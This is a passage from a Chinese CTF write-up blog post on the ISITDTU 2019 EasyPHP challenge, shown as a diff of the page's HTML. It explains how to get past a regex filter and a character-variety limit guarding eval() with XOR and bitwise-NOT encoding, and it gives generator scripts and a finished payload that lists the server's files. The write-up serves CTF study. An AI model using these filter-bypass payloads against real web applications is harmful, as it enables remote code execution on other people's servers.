class="card-archive-list-count">11</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/07/"><span class="card-archive-list-date">七月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/05/"><span class="card-archive-list-date">五月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/04/"><span class="card-archive-list-date">四月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/03/"><span class="card-archive-list-date">三月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">4</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">[ISITDTU 2019]EasyPHP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2025-11-10T10:41:06.000Z" title="发表于 2025-11-10 18:41:06">2025-11-10</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2025-11-10T10:48:08.812Z" title="更新于 2025-11-10 18:48:08">2025-11-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2025/11/10/ISITDTU-2019-EasyPHP/"><header><h1 id="CrawlerTitle" itemprop="name headline">[ISITDTU 2019]EasyPHP</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">everythingis-ok</span><time itemprop="dateCreated datePublished" datetime="2025-11-10T10:41:06.000Z" title="发表于 2025-11-10 18:41:06">2025-11-10</time><time itemprop="dateCreated datePublished" datetime="2025-11-10T10:48:08.812Z" title="更新于 2025-11-10 18:48:08">2025-11-10</time></header><h1 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h1><p>并非easy。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="variable">$_</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;rosé will not do it&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">count_chars</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$_</span>), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>只要绕过两个if就可以实现rce。</p>
 <p>先看第一个正则匹配，</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="hljs-variable">$_</span>)<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="variable">$_</span>)</span><br></pre></td></tr></table></figure>
 
 <p>这个正则匹配的字符包括：</p>
 <ul>
@@ -295,35 +221,35 @@
 <li><strong>ASCII 127（DEL）</strong>。</li>
 </ul>
 <p>再看第二个if：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_</span>), <span class="hljs-number">0x3</span>)) &gt; <span class="hljs-number">0xd</span> )<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">count_chars</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$_</span>), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251110154812637.png" srcset="/img/loading.gif" lazyload alt="image-20251110154812637"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251110154812637.png" alt="image-20251110154812637"></p>
 <p>查询php手册可以看到<code>count_chars()</code><strong>mode</strong>为3时相当于统计字符种类数。</p>
 <p>也就是说我们构造的payload里面字符种类不能超过13中。</p>
 <p>看了一个师傅的博客发现使用这个脚本可以得到不被禁止的函数名，但是过滤结果没有可用函数。</p>
 <p>[<a target="_blank" rel="noopener" href="https://kinseyy.github.io/2024/07/25/ISITDTU-2019-EasyPHP/">ISITDTU 2019]EasyPHP | 北歌</a></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$array</span>=<span class="hljs-title function_ invoke__">get_defined_functions</span>();<span class="hljs-comment">//返回所有内置定义函数</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$array</span>[<span class="hljs-string">&#x27;internal&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$arr</span>)&#123;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9\&#x27;&quot;\`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="hljs-variable">$arr</span>) ) <span class="hljs-keyword">continue</span>;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$arr</span>), <span class="hljs-number">0x3</span>)) &gt; <span class="hljs-number">0xd</span> ) <span class="hljs-keyword">continue</span>;<br>    <span class="hljs-keyword">print</span>(<span class="hljs-variable">$arr</span>.<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">//运行结果</span><br>bcmul<br>rtrim<br>trim<br>ltrim<br>chr<br>link<br>unlink<br>tan<br>atan<br>atanh<br>tanh<br>intval<br>mail<br>min<br>max<br>virtual<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$array</span>=<span class="title function_ invoke__">get_defined_functions</span>();<span class="comment">//返回所有内置定义函数</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$array</span>[<span class="string">&#x27;internal&#x27;</span>] <span class="keyword">as</span> <span class="variable">$arr</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;\`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="variable">$arr</span>) ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">count_chars</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$arr</span>), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">print</span>(<span class="variable">$arr</span>.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//运行结果</span></span><br><span class="line">bcmul</span><br><span class="line">rtrim</span><br><span class="line">trim</span><br><span class="line">ltrim</span><br><span class="line">chr</span><br><span class="line">link</span><br><span class="line">unlink</span><br><span class="line">tan</span><br><span class="line">atan</span><br><span class="line">atanh</span><br><span class="line">tanh</span><br><span class="line">intval</span><br><span class="line">mail</span><br><span class="line">min</span><br><span class="line">max</span><br><span class="line">virtual</span><br></pre></td></tr></table></figure>
 
 <p>再看第一个if发现没有过滤掉~和^，我们可以考虑用按位取反。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;phpinfo&quot;</span>;<br> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">//%8F%97%8F%96%91%99%90</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$a</span>=<span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//%8F%97%8F%96%91%99%90</span></span><br></pre></td></tr></table></figure>
 
 <p>执行成功后我们可以查看查看disable_functions看一下可用函数。</p>
 <p>发现所有的命令执行的函数都被禁了。我们需要找到flag文件，我们可以使用scandir()或者glob()列目录，但它返回一个数组，我们还需要一个print_r或var_dump</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;.&#x27;</span>));<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>));</span><br></pre></td></tr></table></figure>
 
 <p>直接暴力异或，但是发现字符种类数超了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> itertools<br><br>final_string = <span class="hljs-string">&quot;print_r(scandir(&#x27;.&#x27;));&quot;</span><br>allowed = <span class="hljs-string">&quot;!#%()*+-/:;&lt;=&gt;?@ABCHIJKLMNQRTUVWXYZ\\]^abchijklmnqrtuvwxyz&#125;~&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hex0</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0x&#123;:x&#125;&quot;</span>.<span class="hljs-built_in">format</span>(x)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pct_join</span>(<span class="hljs-params">bs</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-string">&quot;%%%02x&quot;</span> % (b &amp; <span class="hljs-number">0xff</span>) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> bs)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># Part 1: exhaustive listing</span><br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> final_string:<br>        oa = <span class="hljs-built_in">ord</span>(a)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> allowed:<br>            oi = <span class="hljs-built_in">ord</span>(i)<br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> allowed:<br>                op = <span class="hljs-built_in">ord</span>(p)<br>                <span class="hljs-keyword">if</span> (oi ^ op) == oa:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;i=<span class="hljs-subst">&#123;hex0(oi)&#125;</span> p=<span class="hljs-subst">&#123;hex0(op)&#125;</span> a=<span class="hljs-subst">&#123;hex0(oa)&#125;</span>&quot;</span>)<br><br>    <span class="hljs-comment"># Part 2: exact payload expression</span><br>    s1 = <span class="hljs-string">&quot;print_r&quot;</span><br>    s2 = <span class="hljs-string">&quot;scandir&quot;</span><br>    dot = <span class="hljs-string">&quot;.&quot;</span><br><br>    I1 = [<span class="hljs-built_in">ord</span>(c) ^ <span class="hljs-number">0xff</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s1]<br>    I2 = [<span class="hljs-built_in">ord</span>(c) ^ <span class="hljs-number">0xff</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s2]<br>    D1 = <span class="hljs-built_in">ord</span>(dot) ^ <span class="hljs-number">0xff</span><br><br>    FF7_pct = <span class="hljs-string">&quot;%ff&quot;</span>*<span class="hljs-number">7</span><br><br>    payload = (<br>        final_string<br>        + <span class="hljs-string">&quot;==&quot;</span><br>        + <span class="hljs-string">f&quot;((<span class="hljs-subst">&#123;pct_join(I1)&#125;</span>)^(<span class="hljs-subst">&#123;FF7_pct&#125;</span>))&quot;</span><br>        + <span class="hljs-string">f&quot;(((<span class="hljs-subst">&#123;pct_join(I2)&#125;</span>)^(<span class="hljs-subst">&#123;FF7_pct&#125;</span>))(%<span class="hljs-subst">&#123;D1:02x&#125;</span>^%ff));&quot;</span><br>    )<br>    <span class="hljs-built_in">print</span>(payload)<br><br>    <span class="hljs-comment"># Optional: verify equals the exact required string</span><br>  <br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br>print_r(scandir(<span class="hljs-string">&#x27;.&#x27;</span>));==((%8f%8d%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%<span class="hljs-number">91</span>%9b%<span class="hljs-number">96</span>%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">final_string = <span class="string">&quot;print_r(scandir(&#x27;.&#x27;));&quot;</span></span><br><span class="line">allowed = <span class="string">&quot;!#%()*+-/:;&lt;=&gt;?@ABCHIJKLMNQRTUVWXYZ\\]^abchijklmnqrtuvwxyz&#125;~&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex0</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0x&#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pct_join</span>(<span class="params">bs</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%%%02x&quot;</span> % (b &amp; <span class="number">0xff</span>) <span class="keyword">for</span> b <span class="keyword">in</span> bs)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># Part 1: exhaustive listing</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> final_string:</span><br><span class="line">        oa = <span class="built_in">ord</span>(a)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> allowed:</span><br><span class="line">            oi = <span class="built_in">ord</span>(i)</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> allowed:</span><br><span class="line">                op = <span class="built_in">ord</span>(p)</span><br><span class="line">                <span class="keyword">if</span> (oi ^ op) == oa:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;i=<span class="subst">&#123;hex0(oi)&#125;</span> p=<span class="subst">&#123;hex0(op)&#125;</span> a=<span class="subst">&#123;hex0(oa)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Part 2: exact payload expression</span></span><br><span class="line">    s1 = <span class="string">&quot;print_r&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;scandir&quot;</span></span><br><span class="line">    dot = <span class="string">&quot;.&quot;</span></span><br><span class="line"></span><br><span class="line">    I1 = [<span class="built_in">ord</span>(c) ^ <span class="number">0xff</span> <span class="keyword">for</span> c <span class="keyword">in</span> s1]</span><br><span class="line">    I2 = [<span class="built_in">ord</span>(c) ^ <span class="number">0xff</span> <span class="keyword">for</span> c <span class="keyword">in</span> s2]</span><br><span class="line">    D1 = <span class="built_in">ord</span>(dot) ^ <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">    FF7_pct = <span class="string">&quot;%ff&quot;</span>*<span class="number">7</span></span><br><span class="line"></span><br><span class="line">    payload = (</span><br><span class="line">        final_string</span><br><span class="line">        + <span class="string">&quot;==&quot;</span></span><br><span class="line">        + <span class="string">f&quot;((<span class="subst">&#123;pct_join(I1)&#125;</span>)^(<span class="subst">&#123;FF7_pct&#125;</span>))&quot;</span></span><br><span class="line">        + <span class="string">f&quot;(((<span class="subst">&#123;pct_join(I2)&#125;</span>)^(<span class="subst">&#123;FF7_pct&#125;</span>))(%<span class="subst">&#123;D1:02x&#125;</span>^%ff));&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Optional: verify equals the exact required string</span></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line">print_r(scandir(<span class="string">&#x27;.&#x27;</span>));==((%8f%8d%<span class="number">96</span>%<span class="number">91</span>%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%<span class="number">91</span>%9b%<span class="number">96</span>%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure>
 
 <p>解决思路是在这16个不重复字符里删减一些，删减的字符用其他字符异或来表示。<br>主要是和%ff异或的那些字符串。其他都是固定的。</p>
 <p>用的是<code>a^b^c=d</code>,把<code>a^b^c</code>替换原来的d，再和%ff异或。<br>即原来的<code>d^%ff = a^b^c^%ff</code>。</p>
 <p>用脚本筛选一下可以被替换掉的字符。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># xor_subs_no_forbidden.py</span><br><span class="hljs-keyword">from</span> itertools import product<br><br>TARGET = <span class="hljs-string">&quot;print_r(scandir(&#x27;.&#x27;));&quot;</span><br><br><span class="hljs-comment"># 不允许作为“材料字符”（x/y/z）参与异或的字面字符：</span><br><span class="hljs-comment"># 注意：这是“字面字符集”的限制，与运算符 ^ 无关。</span><br>FORBIDDEN_BASE = <span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&quot;^;().&#x27;_&quot;</span>)     <span class="hljs-comment"># &lt;- 你要求的：不要把 ^ 和 ; 用作材料</span><br><br><span class="hljs-comment"># 是否允许引入额外的“材料字符”（不在目标串中）</span><br>ALLOW_EXTRA_BASE = False<br>EXTRA_BASE = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment"># 例如: &quot;_()&#123;&#125;&quot;；只有在 ALLOW_EXTRA_BASE=True 时才生效</span><br><br>def <span class="hljs-title function_ invoke__">o</span>(c): <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ord</span>(c)<br><br>def <span class="hljs-title function_ invoke__">find_subs</span>(base_chars, target_chars):<br>    base_codes = [<span class="hljs-title function_ invoke__">o</span>(c) <span class="hljs-keyword">for</span> c in base_chars]<br>    <span class="hljs-comment"># 预建 2 元、3 元查表：值-&gt;(x,y, [z])</span><br>    table2 = &#123;&#125;<br>    <span class="hljs-keyword">for</span> x, y in <span class="hljs-title function_ invoke__">product</span>(base_codes, repeat=<span class="hljs-number">2</span>):<br>        table2.<span class="hljs-title function_ invoke__">setdefault</span>(x ^ y, []).<span class="hljs-title function_ invoke__">append</span>((x, y))<br>    table3 = &#123;&#125;<br>    <span class="hljs-keyword">for</span> x, y, z in <span class="hljs-title function_ invoke__">product</span>(base_codes, repeat=<span class="hljs-number">3</span>):<br>        table3.<span class="hljs-title function_ invoke__">setdefault</span>(x ^ y ^ z, []).<span class="hljs-title function_ invoke__">append</span>((x, y, z))<br><br>    subs2, subs3 = &#123;&#125;, &#123;&#125;<br>    <span class="hljs-keyword">for</span> t in target_chars:<br>        ot = <span class="hljs-title function_ invoke__">o</span>(t)<br>        <span class="hljs-keyword">if</span> ot in table2:<br>            subs2[t] = [(<span class="hljs-title function_ invoke__">chr</span>(x), <span class="hljs-title function_ invoke__">chr</span>(y)) <span class="hljs-keyword">for</span> x, y in table2[ot]]<br>        <span class="hljs-keyword">if</span> ot in table3:<br>            subs3[t] = [(<span class="hljs-title function_ invoke__">chr</span>(x), <span class="hljs-title function_ invoke__">chr</span>(y), <span class="hljs-title function_ invoke__">chr</span>(z)) <span class="hljs-keyword">for</span> x, y, z in table3[ot]]<br>    <span class="hljs-keyword">return</span> subs2, 